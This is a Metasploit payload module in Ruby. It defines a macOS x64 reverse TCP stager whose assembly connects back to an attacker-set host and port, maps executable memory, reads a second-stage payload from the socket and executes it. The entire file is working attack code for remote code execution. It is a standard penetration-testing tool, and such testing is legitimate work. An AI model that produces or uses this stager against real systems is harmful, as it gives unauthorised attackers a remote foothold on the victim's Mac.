##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 154

  include Msf::Payload::Stager

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect, read length, read buffer, execute',
      'Author'      => 'nemo <nemo[at]felinemenace.org>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockedi',
    ))
  end

  def generate(opts = {})
    encoded_port = "%.8x" % [datastore['LPORT'].to_i,2].pack("vv").unpack("N").first
    encoded_host = "%.8x" % Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
    stager_asm = %(
    mov     rcx, ~0x#{encoded_host}#{encoded_port}
    not     rcx
    push    rcx
    xor     ebp, ebp
    bts     ebp, 25

    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    rbp
    pop     rax
    cdq                      ; rdx=IPPROTO_IP
    push    1
    pop     rsi              ; rsi=SOCK_STREAM
    push    2
    pop     rdi              ; rdi=AF_INET
    mov     al, 97
    syscall

    mov     r13, rax
    xchg    eax, edi         ; edi=s
    xchg    eax, esi         ; esi=2

    ; connect (sockfd, {AF_INET,4444,127.0.0.1}, 16);
    push    rbp
    pop     rax
    push    rsp
    pop     rsi
    mov     dl, 16           ; rdx=sizeof(sa)
    mov     al, 98           ; rax=sys_connect
    syscall

    ; mmap(0x0, 0x1000, 0x7, 0x1002, 0x0, 0x0)
    pop r11
    mov rsi, r11
    xor rdi, rdi
    mov rsi, 0x1000
    mov eax, 0x20000c5
    mov edx, 7
    mov r10, 0x1002
    xor r8, r8
    xor r9, r9
    syscall

    ; recvfrom(0x3, addr, 0x1000)
    mov rsi, rax
    push rsi
    mov rdi, r13
    xor rcx, rcx
    mov rdx, 0x1000
    xor r10, r10
    xor r8, r8
    mov eax, 0x200001d
    syscall
    pop rax
    call rax
    )

    Metasm::Shellcode.assemble(Metasm::X64.new, stager_asm).encode_string
  end
end
